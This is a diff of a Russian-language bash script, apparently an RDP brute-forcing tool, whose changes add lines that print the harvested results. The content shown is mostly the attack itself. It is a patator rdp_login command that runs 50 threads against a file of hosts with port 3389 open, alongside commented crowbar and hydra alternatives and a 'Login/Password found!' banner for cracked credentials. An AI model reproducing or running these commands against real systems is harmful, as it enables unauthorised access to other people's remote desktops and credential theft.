@@ -327,7 +327,7 @@ echo -e "                               $green Запуск брутфорса"
 echo ""
 echo -e "$yellow*Обновить INFO-Progress нажать $aquamarine[ENTER] => $green"
 echo "" 
-python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1 -l $PWD/Results
+python patator.py rdp_login host=FILE0 user=$loginbrute password=FILE1 0=open3389 1=$passlist -t 50 --max-retries=2 --rate-limit=1 -x ignore:code=1  -l $PWD/Results
 #python crowbar.py -b rdp -u $loginbrute -C $passlist -S $PWD/open | grep -E 'Trying|RDP-SUCCESS'
 #hydra -l $loginbrute -P $passlist -t 4 -W 3 -o result -M $PWD/open3389 rdp | grep -E '[DATA]|[STATUS]|host|login|password'
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
@@ -20399,6 +20399,7 @@ if [ -s all_results ]
 	then
 	#clear
 	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' >> good
+	cat all_results
 	echo ""
  echo -e "$colorbase                          +---------------------------+"
  echo -e "$colorbase                          |$red   Логин/Пароль найден!    $colorbase|";
@@ -20434,6 +20435,7 @@ if [ -s all_results ]
 	then
 	#clear
 	cat all_results |grep -Eo '([0-9]{1,3}[\.]){3}[0-9]{1,3}[:]{1,2}(\S){0,30}'| sed 'n;d' >> good
+        cat all_results
  echo -e "$colorbase                          +-------------------------+"
  echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
  echo -e           "                          +-------------------------+$red"
